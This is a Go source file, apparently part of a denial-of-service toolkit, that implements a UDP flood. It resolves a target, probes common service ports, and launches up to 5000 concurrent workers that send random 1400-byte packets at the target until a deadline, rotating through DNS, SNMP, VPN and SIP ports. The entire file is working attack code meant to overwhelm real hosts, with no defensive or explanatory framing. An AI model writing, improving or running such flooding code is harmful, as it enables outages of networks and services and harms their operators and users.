package attack

import (
	"log"
	"math/rand"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

func runUDPFlood(cfg *AttackConfig) {
	atomic.StoreInt32(&stopFlag, 0)
	startTime := time.Now()
	deadline := startTime.Add(time.Duration(cfg.Duration) * time.Second)

	targetHost, targetPort := parseL4Target(cfg)

	addrs, err := net.LookupHost(targetHost)
	if err != nil || len(addrs) == 0 {
		log.Printf("[UDP] Cannot resolve %s: %v", targetHost, err)
		return
	}
	targetIP := addrs[0]
	log.Printf("[UDP] Target: %s (%s) port %d", targetHost, targetIP, targetPort)

	// Auto port scan to find responsive ports
	if cfg.OriginIP != "" {
		log.Printf("[UDP] Scanning ports on %s...", targetIP)
		openPorts := ProbePorts(targetIP, []int{80, 443, 8080, 8443, 8000, 8888,
			53, 161, 162, 500, 4500, 1194, 5060, 5353}, 500*time.Millisecond)
		if len(openPorts) > 0 {
			log.Printf("[UDP] Responsive TCP ports (UDP candidates): %v", openPorts)
		}
	}

	// Generate random payloads (pre-allocated for speed)
	payloadSize := 1400 // Max UDP payload without fragmentation
	payloads := make([][]byte, 10)
	for i := range payloads {
		p := make([]byte, payloadSize)
		rand.Read(p)
		payloads[i] = p
	}

	// MAX POWER workers
	workerCount := cfg.Threads
	if workerCount < 100 {
		workerCount = 200
	}
	if workerCount > 5000 {
		workerCount = 5000
	}

	perWorkerPPS := max(1, cfg.RPS/workerCount)
	log.Printf("[UDP] Workers: %d, PPS/worker: %d, Target: %s:%d",
		workerCount, perWorkerPPS, targetIP, targetPort)

	var wg sync.WaitGroup
	rateInterval := time.Second / time.Duration(perWorkerPPS)

	for i := 0; i < workerCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			defer func() {
				if r := recover(); r != nil {
					log.Printf("[UDP] Worker %d recovered: %v", id, r)
				}
			}()

			// Each worker gets its own socket for maximum throughput
			sock, err := net.DialUDP("udp", nil, &net.UDPAddr{
				IP:   net.ParseIP(targetIP),
				Port: targetPort,
			})
			if err != nil {
				log.Printf("[UDP] Worker %d: socket error: %v", id, err)
				return
			}
			defer sock.Close()

			payloadIdx := id % len(payloads)
			portIdx := 0

			for time.Now().Before(deadline) {
				if atomic.LoadInt32(&stopFlag) == 1 {
					return
				}

				payload := payloads[payloadIdx]
				payloadIdx = (payloadIdx + 1) % len(payloads)

				// Rotate target ports to hit all services
				dstPort := targetPort
				// Every 10th packet hits a different port
				if portIdx%10 == 0 {
					altPorts := []int{targetPort, 53, 161, 500, 1194, 5060, 5353, 8080, 8443, 8000}
					dstPort = altPorts[rand.Intn(len(altPorts))]
				}
				portIdx++

				atomic.AddInt64(&metrics.TotalRequests, 1)
				_, err := sock.WriteToUDP(payload, &net.UDPAddr{
					IP:   net.ParseIP(targetIP),
					Port: dstPort,
				})
				if err != nil {
					atomic.AddInt64(&metrics.Failed, 1)
				} else {
					atomic.AddInt64(&metrics.Completed, 1)
				}

				if rateInterval > 0 {
					time.Sleep(rateInterval)
				}
			}
		}(i)
	}

	wg.Wait()
	metricsMu.Lock()
	metrics.Elapsed = time.Since(startTime).Seconds()
	metricsMu.Unlock()
}

